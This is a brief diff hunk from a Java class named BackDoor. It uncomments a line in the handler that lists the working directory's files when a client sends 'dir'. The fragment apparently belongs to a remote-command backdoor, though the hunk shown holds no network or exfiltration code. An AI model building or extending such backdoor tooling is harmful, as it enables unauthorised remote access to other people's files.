@@ -41,7 +41,7 @@ public class BackDoor {
 				}
 				
 				else if(clientCommand.equalsIgnoreCase("dir")){
-					//writer.write("\nShould list files in the current directory \n\n");
+					writer.write("\nShould list files in the current directory \n\n");
 					File currentDirectory=new File(workingDir);
 					File[] allFiles=currentDirectory.listFiles();
 					
